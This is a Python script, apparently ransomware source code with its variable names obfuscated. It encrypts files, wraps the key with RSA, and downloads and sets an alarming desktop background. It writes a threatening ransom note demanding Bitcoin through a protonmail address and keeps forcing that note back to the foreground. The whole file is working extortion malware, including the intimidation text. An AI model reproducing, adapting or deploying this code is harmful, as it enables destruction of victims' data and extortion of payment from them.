#! /usr/bin/python

M=False
I='RANSOM_NOTE.txt'
H='fernet_key.txt'
F='wb'
E=None
D=True
B=open
A=print
from cryptography.fernet import Fernet as G
import os,webbrowser as N,ctypes as O,urllib.request,requests as P,time as C,datetime as Q,subprocess as J,win32gui as K
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES,PKCS1_OAEP as R
import base64,threading as L
class S:
	file_exts=['txt']
	def __init__(A):A.key=E;A.crypter=E;A.public_key=E;A.sysRoot=os.path.expanduser('~');A.localRoot='D:\\Coding\\Python\\RansomWare\\RansomWare_Software\\localRoot';A.publicIP=P.get('https://api.ipify.org').text
	def generate_key(A):A.key=G.generate_key();A.crypter=G(A.key)
	def write_key(A):
		with B(H,F)as C:C.write(A.key)
	def encrypt_fernet_key(A):
		with B(H,'rb')as D:G=D.read()
		with B(H,F)as I:A.public_key=RSA.import_key(B('public.pem').read());J=R.new(A.public_key);C=J.encrypt(G);I.write(C)
		with B(f"{A.sysRoot}Desktop/EMAIL_ME.txt",F)as K:K.write(C)
		A.key=C;A.crypter=E
	def crypt_file(E,file_path,encrypted=M):
		G=file_path
		with B(G,'rb')as H:
			D=H.read()
			if not encrypted:A(D);C=E.crypter.encrypt(D);A('> File encrpyted');A(C)
			else:C=E.crypter.decrypt(D);A('> File decrpyted');A(C)
		with B(G,F)as I:I.write(C)
	def crypt_system(A,encrypted=M):
		E=os.walk(A.localRoot,topdown=D)
		for(F,dir,G)in E:
			for B in G:
				C=os.path.join(F,B)
				if not B.split('.')[-1]in A.file_exts:continue
				if not encrypted:A.crypt_file(C)
				else:A.crypt_file(C,encrypted=D)
	@staticmethod
	def what_is_bitcoin():A='https://bitcoin.org';N.open(A)
	def change_desktop_background(B):C='https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg';A=f"{B.sysRoot}Desktop/background.jpg";urllib.request.urlretrieve(C,A);D=20;O.windll.user32.SystemParametersInfoW(D,0,A,0)
	def ransom_note(A):
		D=Q.date.today().strftime('%d-%B-Y')
		with B(I,'w')as C:C.write(f'''
The harddisks of your computer have been encrypted with an Military grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!

To purchase your key and restore your data, please follow these three easy steps:

1. Email the file called EMAIL_ME.txt at {A.sysRoot}Desktop/EMAIL_ME.txt to GetYourFilesBack@protonmail.com

2. You will recieve your personal BTC address for payment.
   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
   We will check to see if payment has been paid.

3. You will receive a text file with your KEY that will unlock all your files. 
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.

WARNING:
Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlock your files.
Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files-
-and there is a high chance you will lose your files forever.
Do NOT send "PAID" button without paying, price WILL go up for disobedience.
Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.
''')
	def show_ransom_note(H):
		F='notepad.exe';B=J.Popen([F,I]);E=0
		while D:
			C.sleep(.1);G=K.GetWindowText(K.GetForegroundWindow())
			if G=='RANSOM_NOTE - Notepad':A('Ransom note is the top window - do nothing')
			else:A('Ransom note is not the top window - kill/create process again');C.sleep(.1);B.kill();C.sleep(.1);B=J.Popen([F,I])
			C.sleep(10);E+=1
			if E==5:break
	def put_me_on_desktop(E):
		A('started')
		while D:
			try:
				A('trying')
				with B(f"{E.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt",'r')as F:E.key=F.read();E.crypter=G(E.key);E.crypt_system(encrypted=D);A('decrypted');break
			except Exception as H:A(H);pass
			C.sleep(10);A('Checking for PUT_ME_ON_DESKTOP.txt')
def T():B=S();B.generate_key();B.crypt_system();B.write_key();B.encrypt_fernet_key();B.change_desktop_background();B.what_is_bitcoin();B.ransom_note();C=L.Thread(target=B.show_ransom_note);D=L.Thread(target=B.put_me_on_desktop);C.start();A('> RansomWare: Attack completed on target machine and system is encrypted');A('> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine');D.start();A('> RansomWare: Target machine has been un-encrypted');A('> RansomWare: Completed')
if __name__=='__main__':T()
